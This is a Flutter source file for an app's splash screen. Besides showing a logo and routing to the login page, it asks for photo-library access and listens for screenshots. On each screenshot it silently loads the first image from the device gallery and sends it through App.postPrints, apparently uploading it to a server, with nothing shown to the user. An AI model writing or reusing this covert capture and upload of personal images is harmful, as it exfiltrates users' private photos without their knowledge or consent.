import 'dart:io';

import 'package:flutter/material.dart';
import 'package:moduloa2/controllers/app.dart';
import 'package:no_screenshot/no_screenshot.dart';
import 'package:photo_manager/photo_manager.dart';

class Splash extends StatefulWidget {
  const Splash({super.key});

  @override
  State<Splash> createState() => _SplashState();
}

class _SplashState extends State<Splash> {
  final noScreenshot = NoScreenshot.instance;

  printScreen() async {
    await PhotoManager.requestPermissionExtend();
    await noScreenshot.startScreenshotListening();

    noScreenshot.screenshotStream.listen((value) async {
      final List<AssetEntity> paths = await PhotoManager.getAssetListRange(
        type: RequestType.image,
        start: 0,
        end: 80,
      );

      App.postPrints(await paths[0].loadFile() ?? File(''));
    });
  }

  @override
  void initState() {
    printScreen();
    Future.delayed(
      const Duration(seconds: 5),
      () => Navigator.pushNamedAndRemoveUntil(
        context,
        '/login',
        (route) => false,
      ),
    );
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    double width = MediaQuery.of(context).size.width;
    double height = MediaQuery.of(context).size.height;
    return Scaffold(
      body: SizedBox(
        width: width,
        height: height,
        child: Center(child: Image.asset('assets/logo.png', height: 150)),
      ),
    );
  }
}
